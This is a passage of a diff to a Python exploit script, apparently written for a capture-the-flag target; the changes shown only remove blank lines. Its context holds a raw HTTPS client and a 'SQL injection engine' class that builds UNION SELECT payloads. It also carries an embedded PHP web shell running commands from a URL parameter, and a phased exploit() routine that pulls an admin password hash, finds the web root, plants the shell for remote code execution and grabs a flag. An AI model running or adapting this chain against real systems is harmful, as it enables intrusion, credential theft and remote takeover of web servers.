@@ -104,21 +104,18 @@ class UI:
     @staticmethod
     def divider():
         print(f"{Term.RED}{'═' * 70}{Term.RESET}")
-
 @dataclass
 class Response:
     """HTTP response container"""
     status: int
     headers: Dict[str, str]
     body: bytes
-
     @property
     def text(self) -> str:
         return self.body.decode('utf-8', errors='replace')
     @property
     def location(self) -> Optional[str]:
         return self.headers.get('location')
-
 class HTTP:
     """Raw HTTPS client with cookie persistence"""
     def __init__(self, host: str, port: int):
@@ -176,7 +173,6 @@ class HTTP:
             decoded = decoded[:500] + f"\n... ({len(body)} bytes total)"
         print(f"\n{Term.DIM}{decoded}{Term.RESET}")
         print(f"{Term.MAGENTA}{'─'*70}{Term.RESET}\n")
-
     def request(self, method: str, path: str, body: str = None) -> Response:
         conn = self._connect()
         headers = self._headers()
@@ -185,17 +181,14 @@ class HTTP:
             encoded = body.encode('utf-8')
             headers["Content-Type"] = "application/x-www-form-urlencoded"
             headers["Content-Length"] = str(len(encoded))
-
         if VERBOSE:
             self._debug_request(method, path, headers, encoded)
-
         try:
             conn.request(method, path, body=encoded, headers=headers)
             resp = conn.getresponse()
             self._parse_cookies(resp)
             resp_headers = {k.lower(): v for k, v in resp.getheaders()}
             resp_body = resp.read()
-
             if VERBOSE:
                 self._debug_response(resp.status, resp_headers, resp_body)
 
@@ -213,16 +206,13 @@ class HTTP:
         return self.request("GET", path)
     def post(self, path: str, data: Dict[str, str]) -> Response:
         return self.request("POST", path, urllib.parse.urlencode(data))
-
 class SQLi:
     """SQL injection engine"""
-
     SHELL = b'<?php system($_GET["cmd"]); ?>'
     CLOSURE = "')"
     def __init__(self, client: HTTP):
         self.client = client
         self.user: Optional[str] = None
-
     def _union(self, payload: str) -> str:
         return f"{self.CLOSURE} UNION SELECT 1,2,{payload},4-- -"
     def _extract(self, html: str) -> Optional[str]:
@@ -356,14 +346,12 @@ def exploit(target: str) -> Results:
     results.hash = engine.get_hash()
     if results.hash:
         UI.success("Admin Hash", results.hash[:50] + "...")
-
     results.root = engine.get_root()
     if results.root:
         UI.success("Web Root", results.root)
     UI.section("PHASE 3: Remote Code Execution")
     if results.root:
         engine.deploy_shell(results.root)
-
         UI.section("PHASE 4: Flag Capture")
         results.flag = engine.get_flag()
         if results.flag:
@@ -383,10 +371,8 @@ def main():
     global VERBOSE
     args = [a for a in sys.argv[1:] if not a.startswith('-')]
     flags = [a for a in sys.argv[1:] if a.startswith('-')]
-
     if '-v' in flags or '--verbose' in flags:
         VERBOSE = True
-
     target = args[0] if args else os.getenv("TARGET")
     if not target:
         print(f"""
